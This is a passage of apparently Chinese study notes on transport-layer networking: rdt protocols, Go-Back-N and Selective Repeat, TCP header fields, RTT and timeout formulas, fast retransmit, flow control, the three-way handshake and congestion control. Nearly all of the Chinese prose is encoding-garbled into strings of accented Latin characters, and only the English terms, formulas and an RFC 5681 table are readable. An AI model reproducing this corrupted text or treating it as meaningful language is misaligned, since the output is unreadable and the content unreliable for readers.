packetï¼‰ï¼Œè§£å†³è¿™ä¸€é—®é¢˜çš„ä¸€ä¸ªç®€å•æ–¹æ³•æ˜¯ï¼šè®©å‘é€æ–¹å¯¹å…¶æ•°æ®åˆ†ç»„è¿›è¡Œç¼–å·ï¼Œå³æ·»åŠ åºå·ï¼ˆsequence numberï¼‰å­—æ®µï¼Œæ¥æ”¶æ–¹åˆ™åªéœ€è¦æ£€æŸ¥åºå·æ¥åˆ¤æ–­æ˜¯å¦ä¸ºä¸€æ¬¡é‡ä¼ ã€‚    rdt2.1 çš„ FSM å¦‚ä¸‹ï¼ˆæ³¨æ„åˆ°å‘é€æ–¹æ¯æ¬¡å‘é€ä»…ä¸ å½“å‰åˆ†ç»„ å’Œ å‰ä¸€åˆ†ç»„ æœ‰å…³ï¼Œæ‰€ä»¥åªéœ€è¦ä¸¤ä¸ªåºåˆ—çŠ¶æ€ï¼‰ï¼š\nrdt2.2 é€šè¿‡æ›´æ”¹åŒ…è£…å‡½æ•°ï¼Œåœ¨ ACK ä¸­åŠ å…¥äº†å¯¹åº”çš„åºåˆ—å·ä¿¡æ¯ï¼Œå…¶ FSM å¦‚ä¸‹ï¼ˆå‘é€æ–¹å…³é”®åœ¨ isACK(rcvpkt, 0) ä¸ isACK(rcvpkt, 1)ï¼Œæ¥æ”¶æ–¹å…³é”®åœ¨ has_seq0 ä¸ has_seq1ï¼‰ï¼š\nç»å…·æœ‰æ¯”ç‰¹å·®é”™å’Œä¸¢åŒ…ä¿¡æ¯ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“ rdt 3.0 #  æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªåŸºäºæ—¶é—´çš„é‡ä¼ æœºåˆ¶æ¥è§£å†³ä¸¢åŒ…é—®é¢˜ï¼Œéœ€è¦ä¸€ä¸ªå€’æ•°è®¡æ•°å®šæ—¶å™¨ï¼ˆcountdown timerï¼‰ï¼Œåœ¨ä¸€ä¸ªç»™å®šçš„æ—¶é—´é‡è¿‡æœŸåï¼Œå¯ä¸­æ–­å‘é€ã€‚å› æ­¤å‘é€æ–¹çš„å·¥ä½œæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\n æ¯æ¬¡å‘é€ä¸€ä¸ªåˆ†ç»„ï¼ˆåŒ…æ‹¬ç¬¬ä¸€æ¬¡åˆ†ç»„å’Œé‡ä¼ åˆ†ç»„ï¼‰æ—¶ï¼Œä¾¿å¯åŠ¨ä¸€ä¸ªè®¡æ—¶å™¨ï¼› ç›¸åº”è®¡æ—¶å™¨ä¸­æ–­ï¼ˆé‡‡å–é€‚å½“çš„åŠ¨ä½œï¼‰ ç»ˆæ­¢è®¡æ—¶å™¨  å› ä¸ºåˆ†ç»„åºå·åœ¨ 0 å’Œ 1 ä¹‹é—´äº¤æ›¿ï¼Œå› æ­¤ rdt3.0 æœ‰æ—¶åˆè¢«ç§°ä½œæ¯”ç‰¹äº¤æ›¿åè®®ï¼ˆalternating-bit protocolï¼‰ï¼Œå…¶ FSM å¦‚ä¸‹ï¼š\næµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®® #  rdt3.0 æ˜¯ä¸€ä¸ªåŠŸèƒ½æ­£ç¡®çš„åè®®ï¼Œä½†å¹¶éäººäººå¯¹å®ƒçš„æ€§èƒ½æ»¡æ„ï¼Œå®ƒæ€§èƒ½çš„æ ¸å¿ƒåœ¨äºä»–æ˜¯ä¸€ä¸ªåœç­‰åè®®ã€‚è¿™ç§åè®®çš„å‘é€æ–¹ä¿¡é“åˆ©ç”¨ç‡ï¼ˆ$${\\displaystyle U_{sender} = \\frac{L/R}{RTT + L/R}, where\\ R \\Rightarrow sendrate, L \\Rightarrow datalength}$$ï¼‰æä½ã€‚\nå› æ­¤è®¸å¤šåè®®é‡‡ç”¨ä¸€ç§æŠ€æœ¯ï¼Œæ•°æ®æµå¯ä»¥è¢«çœ‹æˆæ˜¯å¡«å……åˆ°ä¸€æ¡æµæ°´çº¿ä¸­ï¼Œæ•…è¿™ç§æŠ€æœ¯è¢«ç§°ä½œæµæ°´çº¿ï¼ˆpipeliningï¼‰ï¼Œå®ƒå¯¹å¯é æ•°æ®ä¼ è¾“åè®®å¸¦æ¥å¦‚ä¸‹å½±å“ï¼š\n  å¿…é¡»å¢åŠ åºåˆ—å·çš„èŒƒå›´ï¼›\n  å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä¸¤ç«¯ä¹Ÿè®¸å¿…é¡»ç¼“å­˜å¤šä¸ªåˆ†ç»„ï¼›\n  ä¸€ä¸ªå¦‚ä½•å¤„ç†ä¸¢å¤±ã€æŸåä»¥åŠå»¶æ—¶è¿‡å¤§åˆ†ç»„çš„æ–¹æ³•ã€‚\nè§£å†³æµæ°´çº¿çš„å·®é”™æ¢å¤æœ‰ä¸¤ç§åŸºæœ¬æ–¹æ³•ï¼šå›é€€ N æ­¥ï¼ˆGo-Back-N, GBNï¼‰å’Œé€‰æ‹©é‡ä¼ ï¼ˆSelective Repeat, SRï¼‰ã€‚\n  å›é€€ N æ­¥ #  æˆ‘ä»¬å®šä¹‰ï¼š\n  çª—å£å¤§å°ï¼ˆwindows sizeï¼‰ Nï¼šGBN åè®®ä¸­ï¼Œæœªç¡®è®¤åˆ†ç»„æ•°ä¸èƒ½è¶…è¿‡çš„æŸä¸ªæœ€å¤§å…è®¸æ•°ç›®ã€‚\n  åŸºåºå·ï¼ˆbaseï¼‰ï¼šæœ€æ—©çš„æœªç¡®è®¤åˆ†ç»„çš„åºå·ï¼›\n  ä¸‹ä¸€åºå·ï¼ˆnextseqnumï¼‰ï¼šæœ€å°çš„æœªä½¿ç”¨åºå·ï¼ˆå³ ä¸‹ä¸€ä¸ªå¾…å‘é€çš„åˆ†ç»„ï¼‰\n  é‚£ä¹ˆï¼Œå¯ä»¥å°†åºå·èŒƒå›´åˆ’åˆ†ä¸ºä»¥ä¸‹çš„å››ä¸ªéƒ¨åˆ†ï¼š\n  å› ä¸º N çš„æ»‘åŠ¨çª—å£çš„å­˜åœ¨ï¼ŒGBN é€šå¸¸åˆè¢«ç§°ä½œæ»‘åŠ¨çª—å£åè®®ï¼ˆsliding-windows protocolï¼‰\n  åœ¨å®è·µä¸­ï¼Œä¸€ä¸ªåˆ†ç»„çš„åºå·å­˜æ”¾åœ¨åˆ†ç»„çš„é¦–éƒ¨ä¸€ä¸ªå›ºå®šçš„å­—æ®µï¼ˆé•¿åº¦ä¸º kï¼‰ä¸­ï¼Œæ‰€æœ‰æ¶‰åŠå­—æ®µçš„è¿ç®—éƒ½å¿…é¡»ä½¿ç”¨æ¨¡ $$2^k$$ è¿ç®—ã€‚\n  åŠ å…¥å˜é‡æ‰©å±•åï¼ŒGBN åè®®ä¸‹çš„ FSM å¦‚ä¸‹ï¼š\nGBN åè®®ä¸‹çš„å‘é€æ–¹å¿…é¡»å“åº”ä¸‰ç§ç±»å‹çš„äº‹ä»¶ï¼š\n ä¸Šå±‚çš„è°ƒç”¨ï¼šå½“ä¸Šå±‚è°ƒç”¨ rdt_send æ—¶ï¼Œå‘é€æ–¹é¦–å…ˆæ£€æŸ¥å‘é€çª—å£æ˜¯å¦å·²æ»¡ï¼Œæœªæ»¡åˆ™äº§ç”Ÿä¸€ä¸ªæ–°çš„åˆ†ç»„å°†å…¶å‘é€ï¼Œå·²æ»¡åˆ™æ‹’ç»è¯·æ±‚æˆ–ç¼“å­˜æ•°æ®ã€‚ æ”¶åˆ°ä¸€ä¸ª ACKï¼šåœ¨ GBN åè®®ä¸­ï¼Œå¯¹åºåˆ—å·ä¸º n åˆ†ç»„çš„ç¡®è®¤é‡‡ç”¨ç´¯è®¡ç¡®è®¤ï¼ˆcumulative acknowledgmentï¼‰çš„æ–¹å¼ï¼šæ”¶åˆ°åºåˆ—å·ä¸º n çš„ ACK $$\\Leftrightarrow$$ æ¥æ”¶æ–¹æ­£ç¡®æ¥æ”¶åˆ°åºå·ä¸º n ä»¥åŠå°äº n çš„æ‰€æœ‰åˆ†ç»„ã€‚ è¶…æ—¶äº‹ä»¶ï¼šå¦‚æœå‡ºç°è¶…æ—¶ï¼Œå‘é€æ–¹å°†é‡ä¼ æ‰€æœ‰å·²å‘é€ä½†è¿˜æœªè¢«ç¡®è®¤è¿‡çš„åˆ†ç»„ã€‚  Noticeï¼šæ¥æ”¶æ–¹ä¼šä¸¢å¼ƒæ‰€æœ‰çš„å¤±åºåˆ†ç»„ï¼ˆå› ä¸ºåˆ†ç»„æœªè¢«ç¡®è®¤ï¼Œæ‰€ä»¥è¯¥åˆ†ç»„ä¼šè¢«å‘é€å‘é‡ä¼ ä¸€éï¼‰ã€‚\nä¸€ä¸ª GBN åè®®ä¸‹çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š\né€‰æ‹©é‡ä¼  #  åœ¨ GBN ä¸­ï¼Œå•ä¸ªåˆ†ç»„çš„å·®é”™å°±ä¼šå¼•èµ· GBN é‡ä¼ å¤§é‡åˆ†ç»„ã€‚é‚£ä¹ˆåºåˆ—èŒƒå›´å°†é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼åˆ’åˆ†ï¼š\nNOTICEï¼šæ¥æ”¶æ–¹æ”¶åˆ°é‡ä¼ çš„æ•°æ®åŒ…åï¼Œäº¦å¿…é¡»å›å¤ ACKã€‚\nå› ä¸ºæ¥æ”¶æ–¹è§‚å¯Ÿå‘é€æ–¹çš„è¡Œä¸ºæ˜¯ä¸€ä¸ªé»‘ç›’ï¼Œæ‰€ä»¥ä¼šå‡ºç°ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼Œå¯¹äºæ¥æ”¶æ–¹æ— æ³•è¾¨è®¤ï¼š\nä¸ºäº†é¿å…è¿™ç§äºŒä¹‰æ€§çš„æƒ…å†µï¼Œçª—å£é•¿åº¦å¿…é¡»å°äºæˆ–ç­‰äºåºåˆ—å·ç©ºé—´çš„ä¸€åŠã€‚\né¢å‘è¿æ¥çš„è¿è¾“ï¼šTCP #  TCP è¿æ¥ #  æ¦‚å¿µï¼š\n TCP çš„é“¾æ¥è¿‡ç¨‹é€šå¸¸è¢«ç§°ä½œä¸‰æ¬¡æ¡æ‰‹ã€‚ æœ€å¤§æŠ¥æ–‡æ®µé•¿åº¦ï¼ˆMaximum Segment Size, MSSï¼‰ï¼šTCP å¯ä»¥ä»ç¼“å­˜ä¸­å–å‡ºå¹¶æ”¾å…¥ç¼“å­˜ä¸­çš„æ•°æ®æ•°é‡ã€‚ æœ€å¤§ä¼ è¾“å•å…ƒï¼ˆMaximum Transmission Unit, MTUï¼‰ï¼šæœ€å¤§é“¾è·¯å±‚å¸§é•¿åº¦ã€‚  æŠ¥æ–‡ç»“æ„ #  é™¤äº†æºç«¯å£å·ã€ç›®çš„ç«¯å£å·ã€æ£€éªŒå’Œå­—æ®µï¼ŒTCP æŠ¥æ–‡é¦–æ®µè¿˜åŒ…æ‹¬ä»¥ä¸‹çš„ç»“æ„ï¼š\n 32 æ¯”ç‰¹çš„åºå·å­—æ®µï¼ˆsequence number fieldï¼‰å’Œ 32 æ¯”ç‰¹çš„ç¡®è®¤å·å­—æ®µï¼ˆacknowledgment number fieldï¼‰ï¼› 16 æ¯”ç‰¹çš„æ¥æ”¶çª—å£å­—æ®µï¼ˆreceive window fieldï¼‰ï¼Œè¯¥å­—æ®µç”¨äºæµé‡æ§åˆ¶ï¼› 4 æ¯”ç‰¹çš„é¦–éƒ¨é•¿åº¦å­—æ®µï¼ˆheader length fieldï¼‰ï¼ŒæŒ‡ç¤ºäº†ä»¥ 32 æ¯”ç‰¹çš„å­—ä¸ºå•ä½çš„ TCP é¦–éƒ¨é•¿åº¦ã€‚ å¯é€‰ä¸å˜é•¿çš„é€‰é¡¹å­—æ®µï¼ˆoptions fieldï¼‰ï¼Œç”¨äºåå•† MSSã€‚ 6 æ¯”ç‰¹çš„æ ‡å¿—å­—æ®µï¼šACKã€RSTã€SYNã€FINã€URGã€PSHã€‚  åºå·ï¼š\n  å› ä¸ºåºå·æ˜¯å»ºç«‹åœ¨ä¼ é€çš„å­—èŠ‚æµä¸Šï¼Œè€Œä¸æ˜¯å»ºç«‹åœ¨ä¼ é€æŠ¥æ–‡æ®µçš„åºåˆ—ä¹‹ä¸Šã€‚æ‰€ä»¥ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·æ˜¯è¯¥æŠ¥æ–‡æ®µé¦–å­—èŠ‚çš„å­—èŠ‚æµç¼–å·ã€‚\n  æ¯”å¦‚ï¼šä¸€ä¸ª MSS ä¸º 1000 å­—èŠ‚çš„æ•°æ®æµï¼Œè‹¥é¦–å­—èŠ‚ç¼–å·ä¸º 0ï¼Œåˆ™ç¬¬ä¸€ä¸ªæŠ¥æ–‡æ®µåˆ†é…åºå· 0ï¼Œç¬¬äºŒä¸ªæŠ¥æ–‡æ®µåˆ†é…åºå· 1000ã€‚\n  ç¡®è®¤å·ï¼š\n ä¸»æœº A å¡«å……è¿›æŠ¥æ–‡æ®µçš„ç¡®è®¤å·æ˜¯ä¸»æœº A æœŸæœ›ä»ä¸»æœº B æ”¶åˆ°çš„ä¸‹ä¸€å­—èŠ‚çš„åºå·ã€‚  åœ¨æŠ¥æ–‡æ— åºåˆ°è¾¾æ¥æ”¶ç«¯æ—¶ï¼ŒTCP çš„ RFC å¹¶æ²¡æœ‰å¯¹æ¬¡æ“ä½œè¿›è¡Œæ˜ç¡®çš„è§„å®šï¼Œè€Œæ˜¯æŠŠè¿™ä¸€é—®é¢˜ç•™ç»™å®ç°ç¼–ç¨‹çš„äººå¤„ç†ï¼Œä»–ä»¬æœ‰ä¸¤ä¸ªåŸºæœ¬çš„é€‰æ‹©ï¼š\n æ¥æ”¶æ–¹ç«‹å³ä¸¢å¼ƒå¤±åºæŠ¥æ–‡æ®µï¼ˆè¿™å¯ä»¥ç®€åŒ–æ¥æ”¶æ–¹çš„è®¾è®¡ï¼‰ï¼› æ¥æ”¶æ–¹ä¿ç•™å¤±åºçš„æŠ¥æ–‡ï¼Œå¹¶ç­‰å¾…ç¼ºå°‘çš„å­—èŠ‚ä»¥å¡«è¡¥è¯¥é—´éš”ã€‚  åœ¨ç†è®ºè®¨è®ºä¸­ï¼Œæˆ‘ä»¬å‡è®¾åˆå§‹åºå·ä¸º 0ã€‚äº‹å®ä¸Šï¼Œä¸€æ¡ TCP è¿æ¥çš„åŒæ–¹å‡å¯ä»¥éšæœºåœ°é€‰æ‹©åˆå§‹åºå·ã€‚è¿™æ ·åšå¯ä»¥å‡å°‘é‚£äº›ä»ç„¶åœ¨ç½‘ç»œä¸­å­˜åœ¨çš„æ¥è‡ªä¸¤å°ä¸»æœºä¹‹é—´å…ˆå‰å·²ç»ç»ˆæ­¢çš„è¿æ¥çš„æŠ¥æ–‡æ®µï¼Œè¯¯è®¤ä¸ºæ˜¯åæ¥è¿™ä¸¤å°ä¸»æœºæ–°å»ºè¿æ¥æ‰€äº§ç”Ÿçš„æœ‰æ•ˆæŠ¥æ–‡çš„å¯èƒ½æ€§ã€‚\nä¼°è®¡å¾€è¿”æ—¶é—´ä¸è¶…æ—¶ #  ä¼°è®¡å¾€è¿”æ—¶é—´ #  TCP ç»´æŒä¸€ä¸ª SampleRTT çš„å‡å€¼ï¼ˆç§°ä¸º EstimatedRTTï¼‰ï¼Œä¸€æ—¦è·å–ä¸€ä¸ªæ–°çš„ SampleRTTï¼ŒTCP å°±ä¼šæ ¹æ®ä»¥ä¸‹çš„å…¬å¼æ¥æ›´æ–° EstimatedRTTï¼š\n$$EstimatedRTT = (1- \\alpha) \\cdot EstimatedRTT + \\alpha \\cdot SampleRTT$$\nåœ¨ [RFC 6298] ä¸­ç»™å‡ºçš„ $$\\alpha$$ å‚è€ƒå€¼æ˜¯ $$\\alpha = 0.125$$ã€‚\nåœ¨ç»Ÿè®¡å­¦è§‚ç‚¹æ¥è®²ï¼Œè¿™ç§å¹³å‡å«åšæŒ‡æ•°åŠ æƒç§»åŠ¨å¹³å‡ï¼ˆExponential Weighted Moving Average, EWMAï¼‰\nå¦å¤–ï¼Œ[RFC 6298] ä¸­è¿˜å®šä¹‰äº† RTT åå·® DevTTï¼Œç”¨äºä¼°ç®— SampleRTT ä¸€èˆ¬ä¼šåç¦» EstimatedRTT çš„ç¨‹åº¦ï¼š\n$$DevRTT = (1-\\beta) \\cdot DevRTT + \\beta \\cdot |SampleRTT - EstimatedRTT|$$\nå…¶ä¸­ï¼Œ$$\\beta$$ çš„æ¨èå€¼ä¸º 0.25ã€‚\nè®¾ç½®å’Œç®¡ç†é‡ä¼ æ—¶é—´ #  ç»¼åˆäº†å‡ ä¸ªæ–¹é¢çš„è€ƒè™‘ï¼ˆç•¥ï¼‰ï¼ŒTCP çš„é‡ä¼ æ—¶é—´é€šè¿‡ä¸‹é¢çš„å…¬å¼ç»™å‡ºï¼š\n$$TimeoutInterval = EstimatedRTT + 4 \\cdot DevRTT$$\nå¯é æ•°æ®è¿æ¥ #  ä¸€äº›æœ‰è¶£çš„æƒ…å†µ #  æƒ…å†µä¸€ï¼ŒACK ä¸¢å¤±æ—¶ï¼Œæ¥æ”¶æ–¹ä¼šæ”¶åˆ°å†—ä½™çš„æ•°æ®æŠ¥ï¼Œå¦‚ä¸‹å›¾ï¼š\næƒ…å†µäºŒï¼Œé‡ä¼ æ—¶é—´è®¾ç½®è¿‡çŸ­æ—¶ï¼Œä¼šå¯¼è‡´åœ¨ ACK åˆ°è¾¾å‘é€æ–¹ä¹‹å‰å‡ºå‘é‡ä¼ ï¼Œå¦‚ä¸‹å›¾ï¼š\næƒ…å†µä¸‰ï¼Œè¿ç»­å‘é€å­—èŠ‚æ•°æ®æ—¶ï¼Œå³ä½¿å‰é¢çš„ ACK ä¸¢å¤±ï¼Œå› ä¸ºç´¯è®¡ç¡®è®¤çš„ç¼˜æ•…åˆ™ä¸ä¼šå¯¼è‡´é‡ä¼ ï¼Œå¦‚ä¸‹å›¾ï¼š\nè¶…æ—¶é—´éš”åŠ å€ #  å¤§å¤šæ•° TCP å®ç°ä¸­éƒ½ä¼šåšè¿™æ ·ä¸€ä¸ªå‚æ•°ä¿®æ”¹ï¼šTCP é‡ä¼ æ—¶ï¼ŒTimeoutInterval ä¼šä½¿ç”¨ DevRTT å’Œ EstimatedRTT è®¡ç®—å‡ºæ—¶é—´çš„ä¸¤å€ï¼›è€Œå½“å®šæ—¶å™¨åœ¨å¦å¤–ä¸¤ä¸ªäº‹ä»¶ï¼ˆæ”¶åˆ°ä¸Šå±‚åº”ç”¨çš„æ•°æ®å’Œæ”¶åˆ° ACKï¼‰ä¸­çš„ä»»æ„ä¸€ä¸ªå¯åŠ¨æ—¶ï¼ŒTimeoutInterval åˆ™ç›´æ¥ä½¿ç”¨ DevRTT å’Œ EstimatedRTT è®¡ç®—å¾—åˆ°çš„å€¼ã€‚\nå¿«é€Ÿé‡ä¼  #  å‘é€æ–¹å¯ä»¥é€šè¿‡æ³¨æ„æ¥æ”¶æ–¹å‘é€çš„å†—ä½™ ACK ï¼ˆè¿™æ˜¯å› ä¸º TCP ä¸ä½¿ç”¨å¦å®šç¡®è®¤ï¼‰æ¥è¾ƒå¥½çš„æ£€æµ‹åˆ°ä¸¢åŒ…æƒ…å†µã€‚\nåœ¨ [RFC 5681] ä¸­ï¼Œç»™å‡ºäº†æ¥æ”¶æ–¹äº§ç”Ÿ ACK çš„å‡ ä¸ªå»ºè®®ï¼š\n   Event TCP Receiver Action     Arrival of in-order segment with expected sequence number. All data up to expected sequence number already acknowledged. Delayed ACK. Wait up to 500 msec for arrival of another in-order segment. If next in-order segment does not arrive in this interval, send an ACK.   Arrival of in-order segment with expected sequence number. One other in-order segment waiting for ACK transmission. Immediately send single cumulative ACK, ACKing both in-order segments.\nï¼ˆç”¨ç´¯ç§¯ ACK åŒæ—¶ç¡®è®¤ç¼“å­˜å’Œæ–°åˆ°è¾¾æŠ¥æ–‡æ®µï¼‰   Arrival of out-of-order segment with higher-than-expected sequence number. Gap detected. Immediately send duplicate ACK, indicating sequence number of next expected byte (which is the lower end of the gap).   Arrival of segment that partially or completely fills in gap in received data. Immediately send ACK, provided that segment starts at the lower end of gap.    åœ¨ [RFC 5681] ä¸­ï¼Œä¸€æ—¦æ”¶åˆ° 3 ä¸ªå†—ä½™ ACKï¼ŒTCP å°±ä¼šæ‰§è¡Œå¿«é€Ÿé‡ä¼ ï¼ˆfast retransmitï¼‰ï¼Œå³åœ¨è¯¥æŠ¥æ–‡çš„å®šæ—¶å™¨è¿‡æœŸä¹‹å‰é‡ä¼ ä¸¢å¤±çš„æŠ¥æ–‡ã€‚\næµé‡æ§åˆ¶ #  TCP ä¸ºå®ƒçš„åº”ç”¨ç¨‹åºæä¾›äº†æµé‡æ§åˆ¶æœåŠ¡ä»¥æ¶ˆé™¤å‘é€æ–¹ä½¿æ¥æ”¶æ–¹ç¼“å­˜æº¢å‡ºçš„å¯èƒ½ã€‚TCP é€šè¿‡è®©å‘é€æ–¹ç»´æŠ¤ä¹æ„ç§°ä¸ºæ¥æ”¶çª—å£ï¼ˆreceiver windowï¼‰çš„å˜é‡æ¥æä¾›æµé‡æ§åˆ¶ã€‚\næ¥æ”¶çª—å£ç”¨ rwnd è¡¨ç¤ºï¼Œæ ¹æ®ç¼“å­˜å¯ç”¨ç©ºé—´çš„æ•°é‡æ¥è®¾ç½®ï¼š\n$$rwnd = RcvBuffer - [LastByteRcvd - LastByteRead]$$\nå³å¯ä»¥ç”¨å¦‚ä¸‹å›¾è¡¨ç¤ºï¼š\nä¸€ä¸ªé—®é¢˜ï¼šTCP çš„æ¥æ”¶æ–¹ä»…å½“åœ¨å®ƒæœ‰æ•°æ®æˆ–æœ‰ç¡®è®¤è¦å‘æ—¶æ‰ä¼šå‘é€æŠ¥æ–‡æ®µç»™å‘é€æ–¹ï¼Œå‘é€æ–¹å¯èƒ½ä¼šä¸çŸ¥é“æ¥æ”¶æ–¹æœ‰æ–°çš„ç©ºé—´ï¼Œå¯¼è‡´å‘é€æ–¹è¢«é˜»å¡è€Œä¸é¥¿èƒ½å†å‘æ•°æ®ã€‚\nä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒTCP çš„è§„èŒƒä¸­è¦æ±‚ï¼šå½“ä¸»æœº B çš„æ¥æ”¶çª—å£ä¸º 0 æ—¶ï¼Œä¸»æœº A ç»§ç»­å‘é€åªæœ‰ä¸€ä¸ªå­—èŠ‚æ•°æ®çš„æŠ¥æ–‡æ®µã€‚è¿™äº›æŠ¥æ–‡æ®µå°†ä¼šè¢«ä¸»æœº B ç¡®è®¤ï¼Œå…¶ä¸­ä¼šå«æœ‰ä¸€ä¸ªé 0 çš„ rwnd å€¼ã€‚\nTCP è¿æ¥ç®¡ç† #  å®¢æˆ·ç«¯ä¸­çš„ TCP ä¼šç”¨ä»¥ä¸‹çš„æ–¹å¼ä¸æœåŠ¡å™¨ä¸­çš„ TCP å»ºç«‹ä¸€æ¡ TCP è¿æ¥ï¼š\n  ç¬¬ä¸€æ­¥ï¼Œå‘é€ä¸€ä¸ªç‰¹æ®Šçš„ TCP æŠ¥æ–‡æ®µï¼ŒåŒ…æ‹¬ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n ä¸å«åº”ç”¨å±‚æ•°æ®ï¼›SYN=1ï¼›éšæœºçš„ä¸€ä¸ªåˆå§‹åºå·ï¼ˆclient_isnï¼‰ã€‚  å› ä¸º SYNï¼Œè¿™ä¸ªç‰¹æ®Šçš„æŠ¥æ–‡ç§°ä½œ SYN æŠ¥æ–‡æ®µã€‚\n  ç¬¬äºŒæ­¥ï¼ŒæœåŠ¡å™¨ä¸ºè¯¥ TCP è¿æ¥åˆ†é… TCP ç¼“å­˜å’Œå˜é‡ï¼Œå¹¶å‘å®¢æˆ· TCP å‘é€å…è®¸è¿æ¥çš„æŠ¥æ–‡æ®µï¼ŒåŒ…æ‹¬ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n ä¸åŒ…å«åº”ç”¨å±‚æ•°æ®ï¼›SYN=1ï¼›ACK=client+1ï¼›é€‰æ‹©æœåŠ¡å™¨è‡ªå·±çš„åˆå§‹åºå·ï¼ˆserver_isnï¼‰ã€‚  è¯¥ç‰¹æ®Šçš„æŠ¥æ–‡æœ‰æ—¶ç§°ä½œ SYNACK æŠ¥æ–‡æ®µã€‚\n  ç¬¬ä¸‰æ­¥ï¼Œå®¢æˆ·ä¹Ÿè¦ç»™è¯¥è¿æ¥åˆ†é…ç¼“å­˜å’Œå˜é‡ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€å¦å¤–ä¸€ä¸ªæŠ¥æ–‡æ®µï¼ŒåŒ…æ‹¬ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n ACK=server_isn+1ï¼›SYN=0ï¼›å¯ä»¥æºå¸¦åº”ç”¨å±‚çš„æ•°æ®ã€‚    å…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nTCP å…³é—­è¿æ¥çš„æµç¨‹å›¾å¦‚äºŒå›¾æ‰€ç¤ºï¼š\nå®¢æˆ·ç«¯çš„ FSM åœ¨å…³é—­æ—¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næ‹¥å¡æ§åˆ¶åŸç† #  æ‹¥å¡æ§åˆ¶æ–¹æ³• #  æˆ‘ä»¬æ ¹æ®ç½‘ç»œå±‚æ˜¯å¦ä¸ºè¿è¾“å±‚æä¾›äº†æ˜¾å¼çš„å¸®åŠ©ï¼Œæ¥åŒºåˆ†æ‹¥å¡æ§åˆ¶çš„æ–¹æ³•ï¼š\n ç«¯åˆ°ç«¯æ‹¥å¡æ§åˆ¶ï¼ˆç½‘ç»œå±‚æ²¡æœ‰ä¸ºè¿è¾“å±‚æä¾›æ˜¾å¼å¸®åŠ© $$\\Rightarrow$$ å³ä½¿ç½‘ç»œä¸­å­˜åœ¨æ‹¥å¡ï¼Œç«¯ç³»ç»Ÿä¹Ÿå¿…é¡»é€šè¿‡å¯¹ç½‘ç»œè¡Œä¸ºçš„è§‚å¯Ÿæ¥æ¨æ–­ä¹‹ï¼‰ï¼š3 æ¬¡å†—ä½™ ACK åï¼Œè®¤ä¸º TCP æŠ¥æ–‡çš„ä¸¢å¤±ï¼ŒTCP ä¼šç›¸åº”åœ°å‡å°å…¶çª—å£é•¿åº¦ã€‚ ç½‘ç»œè¾…åŠ©çš„æ‹¥å¡æ§åˆ¶ï¼ˆç½‘ç»œå±‚æ„ä»¶å‘å‘é€æ–¹æä¾›å…³äºç½‘ç»œå±‚ä¸­æ‹¥å¡çŠ¶æ€çš„æ˜¾å¼åé¦ˆä¿¡æ¯ï¼Œä¸€ä¸ªæ¯”ç‰¹ï¼‰ã€‚  TCP æ‹¥å¡æ§åˆ¶ #  TCP å¿…é¡»ä½¿ç”¨ç«¯åˆ°ç«¯æ‹¥å¡æ§åˆ¶è€Œä¸æ˜¯ä½¿ç½‘ç»œè¾…åŠ©çš„æ‹¥å¡æ§åˆ¶ï¼Œå› ä¸º IP å±‚ä¸å‘ç«¯ç³»ç»Ÿæä¾›æ˜¾å¼çš„ç½‘ç»œæ‹¥å¡åé¦ˆã€‚\nTCP å‘é€æ–¹é€šè¿‡ç»´æŠ¤ä¸€ä¸ªé¢å¤–çš„å˜é‡æ¥æ§åˆ¶å‘ç½‘ç»œä¸­å‘é€æµé‡çš„é€Ÿç‡ï¼Œå³æ‹¥å¡çª—å£ï¼ˆcongestion window, cwndï¼‰ï¼Œåˆ™å‘é€çš„æ•°æ®é‡éœ€è¦æ»¡è¶³ä¸‹é¢çš„å…³ç³»ï¼š\n$$LastByteSent - LastByteAcked \\le min{cwnd, rwnd}$$\næˆ‘ä»¬å°† â€œä¸¢åŒ…äº‹ä»¶â€ å®šä¹‰ä¸ºï¼šå‡ºç°è¶…æ—¶æˆ–æ”¶åˆ°ä¸‰ä¸ªå†—ä½™ ACKã€‚TCP ä½¿ç”¨ä¸‹é¢çš„æŒ‡å¯¼æ€§åŸåˆ™ï¼š\n ä¸€ä¸ªä¸¢å¤±æŠ¥æ–‡å³æ„å‘³ç€æ‹¥å¡ï¼Œåº”å½“é™ä½ TCP å‘é€æ–¹çš„é€Ÿç‡ï¼› å¯¹å…ˆå‰æœªç¡®è®¤æŠ¥æ–‡æ®µçš„ç¡®è®¤åˆ°è¾¾æ—¶ï¼Œåº”å½“å¢åŠ å‘é€æ–¹çš„é€Ÿç‡ï¼› å¸¦å®½æ¢æµ‹ï¼ŒTCP å‘é€æ–¹ä¸æ–­æå‡å‘é€é€Ÿç‡ç›´åˆ°å‡ºç°ä¸¢åŒ…äº‹ä»¶ã€‚  åœ¨ [RFC 5681] ä¸­æå‡ºçš„ TCP æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼ˆTCP congestion control algorithmï¼‰ä¸­åŒ…æ‹¬äº†ä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼šæ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…å’Œå¿«é€Ÿæ¢å¤ã€‚å…¶ä¸­å‰ä¸¤è€…æ˜¯å¼ºåˆ¶éƒ¨åˆ†ï¼Œåè€…æ˜¯æ¨èéƒ¨åˆ†ã€‚\næ…¢å¯åŠ¨ #  å½“ä¸€æ¡ TCP è¿æ¥å¼€å§‹æ—¶ï¼Œcwnd çš„å€¼é€šå¸¸åˆå§‹ç½®ä¸ºä¸€ä¸ª MSS çš„è¾ƒå°å€¼ [RFC 3390]ã€‚\nåœ¨æ…¢å¯åŠ¨çŠ¶æ€ï¼Œcwnd å€¼ä»¥ 1 ä¸ª MSS 